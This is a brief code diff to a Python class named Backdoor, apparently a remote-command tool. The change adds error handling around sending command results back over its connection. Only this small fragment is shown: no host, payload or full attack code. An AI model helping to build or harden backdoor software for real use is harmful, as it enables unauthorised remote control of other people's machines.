@@ -76,7 +76,10 @@ class Backdoor:
             except Exception:
                 command_result = "[-] Error during command execution. "
 
-            self.send_json(command_result)
+            try:
+                self.send_json(command_result)
+            except Exception:
+                self.send_json("Error sending data through JSON")
 
         self.connection.close()
 
